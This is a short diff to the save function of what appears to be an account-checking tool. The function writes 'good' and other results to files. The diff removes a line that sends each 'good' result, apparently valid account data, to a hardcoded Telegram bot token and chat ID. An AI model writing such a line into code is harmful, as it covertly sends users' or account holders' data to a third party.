@@ -87,7 +87,6 @@ def save(name:str,type:str,time:str,content:str):
             with open(f"Results/{time}/{name}_custom.txt","a",errors="ignore") as file: file.write(content+"\n")
         elif type == "good":
             with open(f"Results/{time}/{name}_good.txt","a",errors="ignore") as file: file.write(content+"\n")
-            if Checker.share: get(f'https://api.telegram.org/bot5058115375:AAHar3ywXS0EU1BhVGo2XOFYXoNDG5qc8hw/SendMessage?chat_id=-1001590452857&text={name} - {content}',timeout=5)
         else:
             with open(f"Results/{time}/{name}.txt","a",errors="ignore") as file: file.write(content+"\n")
 
